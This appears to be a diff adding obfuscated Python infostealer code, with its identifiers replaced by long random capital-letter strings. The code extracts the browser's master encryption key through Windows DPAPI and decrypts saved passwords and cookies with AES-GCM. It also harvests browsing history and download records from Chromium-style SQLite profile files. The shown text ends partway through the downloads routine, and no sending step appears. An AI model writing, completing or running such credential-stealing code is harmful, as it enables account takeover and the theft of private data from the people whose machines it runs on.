+    if "cookies" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU = []
+        MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU = 0
+    else:
+        WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU = ""
+        MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU = None
+    if "history" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV = []
+        JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW = 0
+    else:
+        FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV = ""
+        JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW = None
+    if "downloads" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI = []
+        GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC = 0
+    else:
+        VFWUYEPWLCNOHRVSQHUZVMPCVFYVWHCIAOBZLLTOTAEHSZEHJSVNYRKJGWOMMANWXIBGNVORAWPSCNUAKKKOPAHEFDVI = ""
+        GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC = None
+    if "cards" in NAFKPTCSPEJUVGDKTMMNLYVBUBSJYNZDYHMCYJDZCFGDFKZKUQDMEHEXPRWQBOSZHMOOPPHYEJGH:
+        AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY = []
+        QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU = 0
+    else:
+        AVUEJDFEGFQNLXUAJDBWUEGUPAHXJZCPZESDAXMWJPPNSXQYNSUZDMKYQAURFQMTGEJQPPVKKPTGJCMESTLXUIIYNSGSKFY = ""
+        QBSCIMDFNYTOBGHGLZKGMYRBEPIWOWTMEXEWHNDYHLHIDUQPLJGAVNBAOVJVGXNNMQUOFJQSPSU = None
+    
+    def HFAHWFCIJSOAHBMBBGVHTJQRSGGBYRTNNQFFBISJSBZICADOQGDQRCMSHUQAJSAWVBCIIKIBDQOYUWQVJL(NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO):
+        if not os.path.exists(NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO):
+            return None
+
+        try:
+            with open(NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO, 'r', encoding='utf-8') as v4r_f:
+                QWQOPPIHPLEFLDJNRJSOOXHWZLRCOFPAUEFTNUVMZYMXSZQJRNDJQHLEOCOIEXPWRYEMPKDMUYCU = json.load(v4r_f)
+
+            VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_key = base64.b64decode(QWQOPPIHPLEFLDJNRJSOOXHWZLRCOFPAUEFTNUVMZYMXSZQJRNDJQHLEOCOIEXPWRYEMPKDMUYCU["os_crypt"]["encrypted_key"])[5:]
+            UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG = win32crypt.CryptUnprotectData(VHJYJEINTPJLVCYIZHBFMWTEGNAUZWPIIUYLCXRQAGNIXWIMOUEEDQMDEMHRQH_key, None, None, None, 0)[1]
+            return UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG
+        except:
+            return None
+
+    def FPRCCTPOILPWASZPIGQNYELXAZENAMYTIPVYHBUZFVYUFUHEIZYSQKHFZEMFOIWKGDTDJIRHMKCHHWNFNFFLZTWWDQNQ(CUATZTSVUXSDUWOJVYUZJNLQUZOOPTSNXTSNXDAPOERCSKJXVSBCDXKBNTUGUJNDWTIQUQWISFQVODHSJRADAJLTJVIDGRMSEB, UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG):
+        try:
+            UXILDTRAYRMBPEFPPZKDECXVJVFUNSXEJMJSIFGIMXTBJPQTFOFUPJBUOVMYVVZWSWXWSBTLIGMOKMBXWNWJWNYOWLPQLGUXLIJ = CUATZTSVUXSDUWOJVYUZJNLQUZOOPTSNXTSNXDAPOERCSKJXVSBCDXKBNTUGUJNDWTIQUQWISFQVODHSJRADAJLTJVIDGRMSEB[3:15]
+            RJBHMRGKFUJAXHQBSPGUOYIRHTTIWMYLKOJHCZTBJFWWYXNKZCYVFFSUDJHYNXCPCQS = CUATZTSVUXSDUWOJVYUZJNLQUZOOPTSNXTSNXDAPOERCSKJXVSBCDXKBNTUGUJNDWTIQUQWISFQVODHSJRADAJLTJVIDGRMSEB[15:-16]
+            ZRANDFFTOCDRYFLQLJGXFUFTPUXLCTMJIDGNDFPQMSVFWMGRWMATCPDYNNTPDPFGGLGGAGQGPADVRMEIZMFZHCBWUYGXXTO = CUATZTSVUXSDUWOJVYUZJNLQUZOOPTSNXTSNXDAPOERCSKJXVSBCDXKBNTUGUJNDWTIQUQWISFQVODHSJRADAJLTJVIDGRMSEB[-16:]
+            GMXYMNHCXMQXEKAWMEXGRTHTOCTFHNZWKCZWYHGVIAPUIIAYMNMTZOJJSFDSFPNOVENKUXPJRJPVAWMS = Cipher(algorithms.AES(UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG), modes.GCM(UXILDTRAYRMBPEFPPZKDECXVJVFUNSXEJMJSIFGIMXTBJPQTFOFUPJBUOVMYVVZWSWXWSBTLIGMOKMBXWNWJWNYOWLPQLGUXLIJ, ZRANDFFTOCDRYFLQLJGXFUFTPUXLCTMJIDGNDFPQMSVFWMGRWMATCPDYNNTPDPFGGLGGAGQGPADVRMEIZMFZHCBWUYGXXTO))
+            BZKRJNJJZBZVVAFONBSKSWUIMOHCPMWEFKRFFRYMPYDJFSTERRBPEIEISKOXPPBMWDSYSODXEOGRPQWHICDHG = GMXYMNHCXMQXEKAWMEXGRTHTOCTFHNZWKCZWYHGVIAPUIIAYMNMTZOJJSFDSFPNOVENKUXPJRJPVAWMS.decryptor()
+            IZZSCPPOEMHSYOXFVUNMNYIBNVZFOSCOEAHVQBWKMAYZNSTEZQBP = BZKRJNJJZBZVVAFONBSKSWUIMOHCPMWEFKRFFRYMPYDJFSTERRBPEIEISKOXPPBMWDSYSODXEOGRPQWHICDHG.update(RJBHMRGKFUJAXHQBSPGUOYIRHTTIWMYLKOJHCZTBJFWWYXNKZCYVFFSUDJHYNXCPCQS) + BZKRJNJJZBZVVAFONBSKSWUIMOHCPMWEFKRFFRYMPYDJFSTERRBPEIEISKOXPPBMWDSYSODXEOGRPQWHICDHG.finalize()
+            return IZZSCPPOEMHSYOXFVUNMNYIBNVZFOSCOEAHVQBWKMAYZNSTEZQBP.decode()
+        except:
+            return None
+        
+    def ADMGOSXLWGGRTGAAJSNBHUTJEGRRXSADPSJRSPFQMXVZQWDHCFVZULZDUYIQDLBD(YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG):
+        global VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ
+        XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ_db = os.path.join(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, 'Login Data')
+        if not os.path.exists(XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ_db):
+            return
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ = sqlite3.connect(":memory:")
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV = sqlite3.connect(XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ_db)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.backup(WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.close()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI = WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.cursor()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.execute('SELECT action_url, username_value, password_value FROM logins')
+
+        for v4r_row in QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.fetchall():
+            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
+                continue
+            EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA =          f"- Url      : {v4r_row[0]}"
+            VRANQCIPAWMZPZWJLRETJHJFPJWSMRCJNFLTRSXDEPQHUIPVTOEHXMHLWZSZRKNOTNYSQW =     f"  Username : {v4r_row[1]}"
+            XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ =     f"  Password : {FPRCCTPOILPWASZPIGQNYELXAZENAMYTIPVYHBUZFVYUFUHEIZYSQKHFZEMFOIWKGDTDJIRHMKCHHWNFNFFLZTWWDQNQ(v4r_row[2], UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG)}"
+            YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name = f"  Browser  : {YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO}"
+            BXMYTLNHTBXDTXSIRZTNNYESIMQNOXATIWMIQRCZDJDLQXHWIM.append(f"{EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA}\n{VRANQCIPAWMZPZWJLRETJHJFPJWSMRCJNFLTRSXDEPQHUIPVTOEHXMHLWZSZRKNOTNYSQW}\n{XQZCLGYIWDPWGFUKLJCFHKVAXUPJHSYDFQSRKLCTXPVJWSUDPXDPAGZFJ}\n{YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name}\n")
+            VZZQKYMSSQZLYPNMFMZLYHUEBMIABELEPLAWUUSZMVAUFTTBPIPWPJWZYEVNYNFZENGMCSVMAQMKCQAUCGZCJ += 1
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.close()
+
+    def CRABFKBPZBDEJFXZNDWMVVKYFKBBQCBGBSYVQMOVFZQCCBKSZCZ(YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG):
+        global MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU
+        QSZIPHNDXAGQCYPELPWNNKQMSLQPSNJYDCQUUNJCZYGJGDSTOTYSMHVFUQYVODIWKVXWVTKRTXSML = os.path.join(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, 'Network', 'Cookies')
+        if not os.path.exists(QSZIPHNDXAGQCYPELPWNNKQMSLQPSNJYDCQUUNJCZYGJGDSTOTYSMHVFUQYVODIWKVXWVTKRTXSML):
+            return
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ = sqlite3.connect(":memory:")
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV = sqlite3.connect(QSZIPHNDXAGQCYPELPWNNKQMSLQPSNJYDCQUUNJCZYGJGDSTOTYSMHVFUQYVODIWKVXWVTKRTXSML)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.backup(WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.close()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI = WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.cursor()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
+
+        for v4r_row in QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.fetchall():
+            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
+                continue
+            EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA =          f"- Url     : {v4r_row[0]}"
+            QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF =         f"  Name    : {v4r_row[1]}"
+            NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO =         f"  Path    : {v4r_row[2]}"
+            KVCQZMYXOZDPBXSQONJHUEUSERRTMHRZJUMKULIUUOORJMPRHSDPBVJLZEEGXLSPGUEYOMUONDOWIUTANUBMTLKMXONNOBGJIA =       f"  Cookie  : {FPRCCTPOILPWASZPIGQNYELXAZENAMYTIPVYHBUZFVYUFUHEIZYSQKHFZEMFOIWKGDTDJIRHMKCHHWNFNFFLZTWWDQNQ(v4r_row[3], UQSBKEOIZXDPCWGWVGXOQNLNUJHHOYKIZBUFCRRSSVPIRFJGARTXBLSNNYYG)}"
+            DAPSSJYZEIVLXPMBTAHZOBKVKBMEGWWTLNUXHLCIJIBUFSGBIXBTNNVHQNJADM =       f"  Expire  : {v4r_row[4]}"
+            YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name = f"  Browser : {YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO}"
+            WHMXDUCYFKDSZTNIZCUXOZFZSJAMTETGNOLRLKDKJHIOMDRKSCKFQZAFQVMIQOGU.append(f"{EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA}\n{QIHUHYEPWVKHDAFFBWFNFCGVYGESPSEHYBXVONKVONZWFBICEGDTFLKJCHVXEYAIGPWTVSVJMXASF}\n{NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO}\n{KVCQZMYXOZDPBXSQONJHUEUSERRTMHRZJUMKULIUUOORJMPRHSDPBVJLZEEGXLSPGUEYOMUONDOWIUTANUBMTLKMXONNOBGJIA}\n{DAPSSJYZEIVLXPMBTAHZOBKVKBMEGWWTLNUXHLCIJIBUFSGBIXBTNNVHQNJADM}\n{YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name}\n")
+            MRADXHRKQXSFRCZTZCXFUDEUSBPLQUBLUQDBSXHIRJVURICKWFHCVDDMEUKVIVPMXTNLXDJWITDHSMHENIMVKRCU += 1
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.close()
+
+    def FMLXGNZOGXYXWUCWXMDZGCZUTBYKAWLWHLSSXBHKEDGFOSGRJPTWHVLMVYZCLUIRDODPJYUKNKJDSVLMZLRNXIBZOVKKLB(YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB):
+        global JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW
+        GHMXEXPMZGMCNQFSVFTQGQQPBOCMKTUOWKUHXGYPTVBINTEHSQCIJVG = os.path.join(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, 'History')
+        if not os.path.exists(GHMXEXPMZGMCNQFSVFTQGQQPBOCMKTUOWKUHXGYPTVBINTEHSQCIJVG):
+            return
+        
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ = sqlite3.connect(":memory:")
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV = sqlite3.connect(GHMXEXPMZGMCNQFSVFTQGQQPBOCMKTUOWKUHXGYPTVBINTEHSQCIJVG)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.backup(WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.close()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI = WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.cursor()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.execute('SELECT url, title, last_visit_time FROM urls')
+
+        for v4r_row in QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.fetchall():
+            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
+                continue
+            EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA =          f"- Url     : {v4r_row[0]}"
+            HJUWDNHZNLKUXHSLVZXRXHLDZPAFGSFLKBTBPCSVNOASDQZRFZAC =        f"  Title   : {v4r_row[1]}"
+            XVDTPKCXMOIDVRPVBPTEIRMDGWWBWWYMTQAFGMNXYMTZVNJMBCNGRWYYIVJMZBDANNBEXWHIVWJGQDWDGJYI =         f"  Time    : {v4r_row[2]}"
+            YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name = f"  Browser : {YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO}"
+            FFPGSUUCKVPHHHEDVAGBAGAWXRNLTSALYIQUSANLVFVBOMBFMGQOERVXHDELGBIYAFDJNQV.append(f"{EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA}\n{HJUWDNHZNLKUXHSLVZXRXHLDZPAFGSFLKBTBPCSVNOASDQZRFZAC}\n{XVDTPKCXMOIDVRPVBPTEIRMDGWWBWWYMTQAFGMNXYMTZVNJMBCNGRWYYIVJMZBDANNBEXWHIVWJGQDWDGJYI}\n{YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name}\n")
+            JZSCRVUXLTDZXBPEKCLZCCPCZFAXPQSWBSSTUTTFXCYKDLVMENUYECSETHEACLURUVHSXYW += 1
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.close()
+    
+    def VMQZJMXSELOXJWBBQKMRJRZWPRCEKKNQSDKIBTYFGFJGXOAPEBHIKUUHDNUOSMVJBPTMUUYKQBQXUAHD(YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO, JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB):
+        global GQWIOGYFCMWVUQXESOADAFERNBWXBCZPCZSCINUDPHLWHZUUSBAHCIKIXIBFGJMRMXAYXEEWUORYDASRJHASFC
+        GNPZUZHCQBDKHTNGHOERXVMJJWATZNQPAPVOYDQUVLJLRPLPNTXYEOIONWGQTNVWEHLRRCAJMFKXBFGZOVMJODGSYEZQCWJQ = os.path.join(JQKYYGOAZCZQHPGFQUWOFBKAJXRURWIZMLYLQIJRZQVVZQFMVSLHBHXBQBLQFDJRJKDJKTXHKAEENOVGUQHISB, 'History')
+        if not os.path.exists(GNPZUZHCQBDKHTNGHOERXVMJJWATZNQPAPVOYDQUVLJLRPLPNTXYEOIONWGQTNVWEHLRRCAJMFKXBFGZOVMJODGSYEZQCWJQ):
+            return
+
+        WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ = sqlite3.connect(":memory:")
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV = sqlite3.connect(GNPZUZHCQBDKHTNGHOERXVMJJWATZNQPAPVOYDQUVLJLRPLPNTXYEOIONWGQTNVWEHLRRCAJMFKXBFGZOVMJODGSYEZQCWJQ)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.backup(WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ)
+        MUKXNQCLZPHQVHORCMPCEKNYIJAXRQQFVDJSEORORCXKSSBIWRNUNPLUMOSKZFEDUKRQDUGDXESFQZDOCLNCPDKHJAIELBYV.close()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI = WLBNICMQGIGVDSSRLYIWIZIPIPYQEVPJLBRZNVKDEAVGLAYFCDIKSVMCYWRIVAOPKMWDIEGCZXRHMWHMFONXQAZZ.cursor()
+        QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.execute('SELECT tab_url, target_path FROM downloads')
+        for row in QBXRWPLOJHEBYXLOWNZOZUHQMXNVIIJCNFTXKFVZCBIBUCDCCKPHHUVYIQLXESHZNUOAFI.fetchall():
+            if not row[0] or not row[1]:
+                continue
+            NYGTRUQGLCSZQQEUVTIYVDHHNZASKFBEIUPIVVDLMWUXKLXMTNKTAIDOLATIASFNERQAVNBCMIXCHMDXEOOJO =         f"- Path    : {row[1]}"
+            EXVJXAWJLGMLRZQUULYNSPABZZKEWPVLCKDLOLPCSDCICDTLFVUNRRNCSJABCQYYDSNCXKRIFHVMMFKLJIQGWFMTCXNJIAGA =          f"  Url     : {row[0]}"
+            YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO_name = f"  Browser : {YQZGOMPOKDZLUJRGWHDBHXEGPKNQDEIOIAUMUZTGRMNPYCJZWUYLZJGOMHBVDDUFNRWOHEFJLPLOPVCANXNVYASWDEACBMO}"
